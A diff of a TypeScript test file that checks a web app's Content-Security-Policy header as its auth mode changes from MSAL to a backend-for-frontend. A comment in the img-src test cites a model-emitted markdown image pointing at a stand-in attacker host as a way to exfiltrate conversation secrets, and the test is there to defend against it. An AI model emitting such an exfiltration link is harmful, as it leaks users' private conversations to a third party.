@@ -14,9 +14,9 @@
  *    every structure falls to the "could not render" box and the sketcher dies on first use;
  *  - adding `'unsafe-inline'` to `script-src`: the reason `/config.js` is a real same-origin file
  *    rather than an inline tag, and the reason `renderConfigScript` escapes `<`, both evaporate;
- *  - the `msal` branch losing `login.microsoftonline.com` from `connect-src`: MSAL's hidden-iframe
- *    silent refresh is blocked, producing what the source calls "a random logout" about an hour
- *    after every login.
+ *  - the policy growing an origin for the identity provider: the browser holds no token and never
+ *    talks to it (sign-in is a top-level navigation), so every auth mode sends the same header and
+ *    any widening is a regression.
  *
  * Driven through `cfg.csp` after a fresh import rather than by exporting `buildCsp`, because the
  * property worth pinning is what this process will actually *send* for a given environment — a
@@ -38,14 +38,14 @@ async function csp(env: Record<string, string> = {}): Promise<Map<string, string
   return parsed;
 }
 
-const MSAL = {
-  AUTH_MODE: 'msal',
+const BFF = {
+  AUTH_MODE: 'bff',
   ENTRA_TENANT_ID: 't',
   ENTRA_CLIENT_ID: 'c',
+  ENTRA_CLIENT_SECRET: 's',
   API_SCOPE: 'api://c/Chat.Access',
+  APP_ORIGIN: 'https://app.example',
 };
-
-const ENTRA_HOST = 'https://login.microsoftonline.com';
 
 afterEach(() => {
   vi.unstubAllEnvs();
@@ -55,7 +55,7 @@ afterEach(() => {
 describe('script execution', () => {
   it.each([
     ['dev', {}],
-    ['msal', MSAL],
+    ['bff', BFF],
   ])('permits WASM and nothing else in %s mode', async (_mode, env) => {
     const directives = await csp(env);
     const scriptSrc = directives.get('script-src') ?? [];
@@ -74,7 +74,7 @@ describe('script execution', () => {
 
   it.each([
     ['dev', {}],
-    ['msal', MSAL],
+    ['bff', BFF],
   ])('pins img-src to local sources only in %s mode', async (_mode, env) => {
     // The last line of defence against conversation exfiltration via a model-emitted
     // `![](https://attacker/?q=<secret>)`. `Markdown.tsx` refuses to render an external `<img>`
@@ -98,24 +98,18 @@ describe('script execution', () => {
   });
 });
 
-describe('the MSAL branch', () => {
-  it('opens exactly the three directives the silent refresh needs', async () => {
-    const directives = await csp(MSAL);
-
-    // The hidden iframe has to be created (`frame-src`), has to talk to the login host
-    // (`connect-src`), and the redirect has to be allowed to POST back (`form-action`).
-    expect(directives.get('connect-src')).toEqual(["'self'", ENTRA_HOST]);
-    expect(directives.get('frame-src')).toEqual([ENTRA_HOST]);
-    expect(directives.get('form-action')).toEqual(["'self'", ENTRA_HOST]);
-  });
-
-  it('does not open them in dev mode, where nothing talks to Entra', async () => {
-    // The other direction, and what makes the assertion above mean something: if the login host
-    // were unconditional, the msal test would pass with the branch deleted.
-    const directives = await csp();
-    expect(directives.get('connect-src')).toEqual(["'self'"]);
-    expect(directives.get('frame-src')).toEqual(["'none'"]);
-    expect(directives.get('form-action')).toEqual(["'self'"]);
+describe('the identity provider', () => {
+  it('is not an origin the page may talk to, frame or post to, in any auth mode', async () => {
+    // The BFF does the whole exchange, so the policy stays closed — and a login host appearing
+    // here would mean a script on the page can reach it.
+    for (const env of [{}, BFF, { ...BFF, ENTRA_AUTHORITY: 'https://login.example/tenant' }]) {
+      const directives = await csp(env);
+      expect(directives.get('connect-src')).toEqual(["'self'"]);
+      expect(directives.get('frame-src')).toEqual(["'none'"]);
+      expect(directives.get('form-action')).toEqual(["'self'"]);
+      const everything = [...directives.values()].flat().join(' ');
+      expect(everything).not.toMatch(/microsoftonline|login\.example/);
+    }
   });
 });
 
@@ -124,7 +118,7 @@ describe('framing', () => {
     // A dev-mode UI requires no sign-in and opens every authorization gate, so it is the
     // deployment that can least afford to be clickjacked. `ALLOW_FRAMING` is the one knob.
     expect((await csp()).get('frame-ancestors')).toEqual(["'none'"]);
-    expect((await csp(MSAL)).get('frame-ancestors')).toEqual(["'none'"]);
+    expect((await csp(BFF)).get('frame-ancestors')).toEqual(["'none'"]);
   });
 
   it('is permitted when the deployment says so', async () => {
@@ -133,23 +127,12 @@ describe('framing', () => {
 });
 
 /**
- * The production default, byte for byte.
- *
- * `ENTRA_AUTHORITY` made the MSAL origin in this header configurable, and the one property that
- * must survive that is that a deployment which sets nothing sends **exactly** the header it sent
- * before. These literals are the header `main` produced before the change (captured from
- * `cfg.csp` at 55bd5f2), so any drift at all — a reordered directive, a doubled space, a trailing
- * slash on the origin — fails here rather than in a browser an hour after sign-in.
+ * The header, byte for byte: one literal, and the same in every auth mode. Any drift — a reordered
+ * directive, a doubled space, an origin that should not be there — fails here rather than in a
+ * browser.
  */
-describe('the production default, unchanged', () => {
-  const MSAL_DEFAULT_CSP =
-    "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; " +
-    "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; " +
-    "connect-src 'self' https://login.microsoftonline.com; " +
-    'frame-src https://login.microsoftonline.com; ' +
-    "form-action 'self' https://login.microsoftonline.com; base-uri 'none'; " +
-    "frame-ancestors 'none'; object-src 'none'";
-  const DEV_DEFAULT_CSP =
+describe('the default header', () => {
+  const DEFAULT_CSP =
     "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; " +
     "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; " +
     "connect-src 'self'; frame-src 'none'; form-action 'self'; base-uri 'none'; " +
@@ -161,48 +144,11 @@ describe('the production default, unchanged', () => {
     return (await import('../server/config.ts')).cfg.csp;
   }
 
-  it('sends the pre-change msal header when ENTRA_AUTHORITY is unset', async () => {
-    expect(await header(MSAL)).toBe(MSAL_DEFAULT_CSP);
-  });
-
-  it('sends the same header when ENTRA_AUTHORITY names the default authority explicitly', async () => {
-    expect(await header({ ...MSAL, ENTRA_AUTHORITY: 'https://login.microsoftonline.com/t' })).toBe(
-      MSAL_DEFAULT_CSP,
-    );
-  });
-
-  it('sends the pre-change dev header, which no authority setting reaches', async () => {
-    expect(await header({})).toBe(DEV_DEFAULT_CSP);
-    expect(await header({ ENTRA_AUTHORITY: 'https://127.0.0.1:8443/entra/mock-tenant' })).toBe(
-      DEV_DEFAULT_CSP,
-    );
-  });
-});
-
-describe('a configured authority', () => {
-  it('opens its origin — not its path, and not Entra — in the three MSAL directives', async () => {
-    const directives = await csp({
-      ...MSAL,
-      ENTRA_AUTHORITY: 'https://127.0.0.1:8443/entra/mock-tenant',
-    });
-    const origin = 'https://127.0.0.1:8443';
-    expect(directives.get('connect-src')).toEqual(["'self'", origin]);
-    expect(directives.get('frame-src')).toEqual([origin]);
-    expect(directives.get('form-action')).toEqual(["'self'", origin]);
-    // Replaced, not added to: a deployment pointed elsewhere has no business talking to Entra.
-    expect([...directives.values()].flat()).not.toContain(ENTRA_HOST);
-  });
-
-  it('leaves every other directive exactly as the default sends it', async () => {
-    const configured = await csp({
-      ...MSAL,
-      ENTRA_AUTHORITY: 'https://login.microsoftonline.us/t',
-    });
-    const standard = await csp(MSAL);
-    for (const name of ['connect-src', 'frame-src', 'form-action']) {
-      configured.delete(name);
-      standard.delete(name);
-    }
-    expect(configured).toEqual(standard);
+  it.each([
+    ['dev', {}],
+    ['bff', BFF],
+    ['bff with its own authority', { ...BFF, ENTRA_AUTHORITY: 'https://127.0.0.1:8443/entra/t' }],
+  ])('is the same literal in %s mode', async (_mode, env) => {
+    expect(await header(env)).toBe(DEFAULT_CSP);
   });
 });
